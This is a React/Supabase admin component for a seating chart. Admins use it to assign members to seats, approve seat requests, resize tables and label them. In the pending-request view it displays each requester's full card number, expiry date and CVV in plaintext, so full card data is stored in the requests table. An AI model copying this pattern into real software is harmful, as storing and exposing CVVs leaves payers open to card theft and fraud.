'use client'

import { useState, useEffect } from 'react'
import { createClient } from '@/lib/supabase'
import { Table, Seat, SeatRequest } from '@/lib/types'
import toast from 'react-hot-toast'

interface EditDrawerProps {
  table: Table
  onClose: () => void
  onRefresh: () => void
}

function formatTime(ts: string) {
  return new Date(ts).toLocaleString('en-US', {
    month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit',
  })
}

// ─── SeatEditor ─────────────────────────────────────────────────────────────

function SeatEditor({
  seat,
  requests,
  onRefresh,
}: {
  seat: Seat
  requests: SeatRequest[]
  onRefresh: () => void
}) {
  const supabase = createClient()
  const [name, setName]     = useState(seat.member_name ?? '')
  const [saving, setSaving] = useState(false)
  useEffect(() => { setName(seat.member_name ?? '') }, [seat.member_name])

  async function saveName() {
    setSaving(true)
    const trimmed = name.trim()
    await supabase
      .from('seats')
      .update({
        member_name: trimmed || null,
        is_reserved: !!trimmed,
      })
      .eq('id', seat.id)
    setSaving(false)
    toast.success('Saved')
    onRefresh()
  }

  async function clearSeat() {
    await supabase
      .from('seats')
      .update({ member_name: null, is_reserved: false })
      .eq('id', seat.id)
    toast.success('Seat cleared')
    setName('')
    onRefresh()
  }

  async function approveRequest(req: SeatRequest) {
    const { error } = await supabase.rpc('approve_request', {
      p_request_id: req.id,
      p_seat_id: seat.id,
      p_name: req.requester_name,
    })
    if (!error) {
      toast.success(`Approved — ${req.requester_name}`)
      onRefresh()
      return
    }
    // Manual fallback if RPC unavailable
    await supabase.from('seats').update({
      member_name: req.requester_name,
      is_reserved: true,
    }).eq('id', seat.id)
    await supabase.from('requests').update({ status: 'approved' }).eq('id', req.id)
    await supabase
      .from('requests')
      .update({ status: 'declined' })
      .eq('seat_id', seat.id)
      .neq('id', req.id)
      .eq('status', 'pending')
    toast.success(`Approved — ${req.requester_name}`)
    onRefresh()
  }

  async function declineRequest(req: SeatRequest) {
    const { error } = await supabase.from('requests').update({ status: 'declined' }).eq('id', req.id)
    if (error) toast.error('Failed to decline')
    else { toast.success('Declined'); onRefresh() }
  }

  const pending = requests.filter(r => r.status === 'pending')
  const other   = requests.filter(r => r.status !== 'pending')

  return (
    <div className="border border-gray-200 rounded-xl p-3 mb-3 bg-white">
      <div className="flex items-center justify-between mb-2">
        <p className="font-garamond text-sm text-gray-600">Seat #{seat.position}</p>
      </div>

      <div className="flex gap-2 mb-3">
        <input
          type="text"
          value={name}
          onChange={e => setName(e.target.value)}
          placeholder="Member name"
          className="flex-1 border border-gray-300 rounded-lg px-2 py-1.5 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
          onKeyDown={e => e.key === 'Enter' && saveName()}
        />
        <button
          onClick={saveName}
          disabled={saving}
          className="px-3 py-1.5 bg-blue-600 text-white text-sm rounded-lg hover:bg-blue-700 disabled:opacity-50 transition-colors"
        >
          {saving ? '…' : 'Save'}
        </button>
        <button
          onClick={clearSeat}
          className="px-3 py-1.5 border border-gray-300 text-gray-600 text-sm rounded-lg hover:bg-gray-50 transition-colors"
        >
          Clear
        </button>
      </div>

      {/* Pending requests */}
      {pending.length > 0 && (
        <div>
          <p className="text-xs font-medium text-gray-500 uppercase tracking-wide mb-1.5">
            Pending Requests
          </p>
          {pending.map(req => (
            <div key={req.id} className="bg-yellow-50 border border-yellow-200 rounded-lg p-2 mb-1.5">
              <div className="flex items-start justify-between gap-2">
                <div className="min-w-0">
                  <p className="text-sm font-medium text-gray-800 truncate">{req.requester_name}</p>
                  <p className="text-xs text-gray-500 truncate">{req.requester_contact}</p>
                  {req.note && <p className="text-xs text-gray-600 mt-0.5 italic">&ldquo;{req.note}&rdquo;</p>}
                  {req.card_number && (
                    <p className="text-xs text-gray-500 mt-0.5 font-mono tracking-wider">
                      💳 {req.card_number}{req.exp_date ? `  ${req.exp_date}` : ''}{req.cvv ? `  CVV ${req.cvv}` : ''}
                    </p>
                  )}
                  <div className="flex items-center gap-2 mt-0.5 flex-wrap">
                    <p className="text-[10px] text-gray-400">{formatTime(req.created_at)}</p>
                  </div>
                </div>
                <div className="flex gap-1 shrink-0">
                  <button
                    onClick={() => approveRequest(req)}
                    className="px-2 py-1 bg-green-600 text-white text-xs rounded-md hover:bg-green-700 transition-colors"
                  >
                    ✓ Approve
                  </button>
                  <button
                    onClick={() => declineRequest(req)}
                    className="px-2 py-1 border border-red-300 text-red-600 text-xs rounded-md hover:bg-red-50 transition-colors"
                  >
                    ✗
                  </button>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}

      {other.length > 0 && (
        <details className="mt-1">
          <summary className="text-xs text-gray-400 cursor-pointer">
            {other.length} past request{other.length !== 1 ? 's' : ''}
          </summary>
          {other.map(req => (
            <div key={req.id} className="text-xs text-gray-400 mt-1 pl-1">
              {req.requester_name} — <span className="capitalize">{req.status}</span>
            </div>
          ))}
        </details>
      )}
    </div>
  )
}

// ─── EditDrawer ──────────────────────────────────────────────────────────────

export default function EditDrawer({ table, onClose, onRefresh }: EditDrawerProps) {
  const supabase = createClient()
  const [seats, setSeats]           = useState<Seat[]>([])
  const [allRequests, setAllRequests] = useState<SeatRequest[]>([])
  const [bulkName, setBulkName]     = useState('')
  const [labelInput, setLabelInput] = useState(table.label ?? '')
  const [loading, setLoading]       = useState(false)

  async function fetchRequests(seatIds: string[]) {
    if (seatIds.length === 0) return
    const { data } = await supabase
      .from('requests')
      .select('*')
      .in('seat_id', seatIds)
      .order('created_at', { ascending: true })
    if (data) setAllRequests(data as SeatRequest[])
  }

  async function fetchSeats(): Promise<Seat[]> {
    const { data } = await supabase.from('seats').select('*').eq('table_id', table.id)
    const posMap = new Map<number, Seat>()
    for (const s of ((data ?? []) as Seat[])) {
      if (!posMap.has(s.position)) posMap.set(s.position, s)
    }
    const deduped = [...posMap.values()]
    setSeats(deduped)
    return deduped
  }

  async function refresh() {
    const freshSeats = await fetchSeats()
    await fetchRequests(freshSeats.map(s => s.id))
    onRefresh()
  }

  useEffect(() => {
    fetchSeats().then(fetched => fetchRequests(fetched.map(s => s.id)))
  }, [])

  // ── Variable seat count ──
  async function addSeat() {
    const sorted = [...seats].sort((a, b) => a.position - b.position)
    const maxPos = sorted.at(-1)?.position ?? 0
    if (maxPos >= 5) { toast.error('Maximum 5 seats per table'); return }
    setLoading(true)
    await supabase.from('seats').insert({ table_id: table.id, position: maxPos + 1 })
    setLoading(false)
    await refresh()
    toast.success('Seat added')
  }

  async function removeSeat() {
    const sorted = [...seats].sort((a, b) => a.position - b.position)
    const last = sorted.at(-1)
    if (!last) return
    if (seats.length <= 1) { toast.error('Table must have at least 1 seat'); return }
    if (last.is_reserved || last.member_name) {
      toast.error('Cannot remove a reserved seat — clear it first')
      return
    }
    setLoading(true)
    await supabase.from('seats').delete().eq('id', last.id)
    setLoading(false)
    await refresh()
    toast.success('Seat removed')
  }

  // ── Bulk actions ──
  async function assignWholeTable() {
    if (!bulkName.trim()) return
    setLoading(true)
    await supabase
      .from('seats')
      .update({ member_name: bulkName.trim(), is_reserved: true })
      .eq('table_id', table.id)
    toast.success(`All seats assigned to ${bulkName.trim()}`)
    setBulkName('')
    setLoading(false)
    refresh()
  }

  async function clearWholeTable() {
    if (!confirm('Clear all seats at this table?')) return
    setLoading(true)
    await supabase
      .from('seats')
      .update({ member_name: null, is_reserved: false })
      .eq('table_id', table.id)
    toast.success('Table cleared')
    setLoading(false)
    refresh()
  }

  async function toggleActive() {
    await supabase.from('tables').update({ is_active: !table.is_active }).eq('id', table.id)
    toast.success(table.is_active ? 'Marked inactive' : 'Marked active')
    onRefresh()
  }

  async function saveLabel() {
    await supabase.from('tables').update({ label: labelInput.trim() || null }).eq('id', table.id)
    toast.success('Label saved')
    onRefresh()
  }

  const sortedSeats = [...seats].sort((a, b) => a.position - b.position)

  return (
    <>
      {/* Backdrop */}
      <div className="fixed inset-0 z-40 bg-black/30" onClick={onClose} />

      {/* Drawer */}
      <div className="fixed right-0 top-0 bottom-0 z-50 w-full max-w-md bg-gray-50 shadow-2xl overflow-y-auto">
        <div className="p-4">

          {/* Header */}
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="font-garamond text-2xl text-gray-800">
                Table {table.row}{table.col}
              </h2>
              {table.label && <p className="text-sm text-gray-500">{table.label}</p>}
            </div>
            <button onClick={onClose} className="text-gray-400 hover:text-gray-600 text-2xl leading-none">×</button>
          </div>

          {/* Seat count control */}
          <div className="flex items-center gap-3 mb-3 p-2.5 bg-white border border-gray-200 rounded-xl">
            <span className="text-sm text-gray-600 flex-1">
              Seats: <strong>{sortedSeats.length}</strong>
              <span className="text-xs text-gray-400 ml-1">(3–5)</span>
            </span>
            <button
              onClick={removeSeat}
              disabled={loading || sortedSeats.length <= 1}
              className="w-8 h-8 flex items-center justify-center rounded-lg border border-gray-300 text-gray-600 hover:bg-gray-50 disabled:opacity-40 transition-colors text-lg leading-none"
              title="Remove last seat"
            >
              −
            </button>
            <button
              onClick={addSeat}
              disabled={loading || sortedSeats.length >= 5}
              className="w-8 h-8 flex items-center justify-center rounded-lg border border-gray-300 text-gray-600 hover:bg-gray-50 disabled:opacity-40 transition-colors text-lg leading-none"
              title="Add a seat"
            >
              +
            </button>
          </div>

          {/* Per-seat editors */}
          <h3 className="text-xs font-medium uppercase tracking-wide text-gray-500 mb-2">Seats</h3>
          {sortedSeats.map(seat => (
            <SeatEditor
              key={seat.id}
              seat={seat}
              requests={allRequests.filter(r => r.seat_id === seat.id)}
              onRefresh={refresh}
            />
          ))}

          {/* Table-level actions */}
          <div className="mt-4 border-t border-gray-200 pt-4 flex flex-col gap-3">
            <h3 className="text-xs font-medium uppercase tracking-wide text-gray-500">Table Actions</h3>

            {/* Assign whole table */}
            <div className="flex gap-2">
              <input
                type="text"
                value={bulkName}
                onChange={e => setBulkName(e.target.value)}
                placeholder={`Name for all ${sortedSeats.length} seats`}
                className="flex-1 border border-gray-300 rounded-lg px-2 py-1.5 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
              />
              <button
                onClick={assignWholeTable}
                disabled={loading || !bulkName.trim()}
                className="px-3 py-1.5 bg-blue-600 text-white text-sm rounded-lg hover:bg-blue-700 disabled:opacity-50 transition-colors whitespace-nowrap"
              >
                Assign All
              </button>
            </div>

            <button
              onClick={clearWholeTable}
              disabled={loading}
              className="w-full py-2 border border-red-300 text-red-600 text-sm rounded-lg hover:bg-red-50 transition-colors"
            >
              Clear Whole Table
            </button>

            {/* Table Name */}
            <div>
              <label className="block text-xs font-medium text-gray-500 uppercase tracking-wide mb-1">
                Table Name
              </label>
              <p className="text-[11px] text-gray-400 mb-1.5">
                Shown on the chart, e.g. Rabbi&apos;s Table
              </p>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={labelInput}
                  onChange={e => setLabelInput(e.target.value)}
                  placeholder="e.g. Rabbi's Table"
                  className="flex-1 border border-gray-300 rounded-lg px-2 py-1.5 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
                  onKeyDown={e => e.key === 'Enter' && saveLabel()}
                />
                <button
                  onClick={saveLabel}
                  className="px-3 py-1.5 border border-gray-300 text-gray-700 text-sm rounded-lg hover:bg-gray-100 transition-colors"
                >
                  Save
                </button>
              </div>
            </div>

            {/* Active toggle */}
            <button
              onClick={toggleActive}
              className={`w-full py-2 text-sm rounded-lg border transition-colors ${
                table.is_active
                  ? 'border-orange-300 text-orange-600 hover:bg-orange-50'
                  : 'border-green-300 text-green-600 hover:bg-green-50'
              }`}
            >
              {table.is_active ? '⬛ Mark Inactive' : '✅ Mark Active'}
            </button>
          </div>

        </div>
      </div>
    </>
  )
}
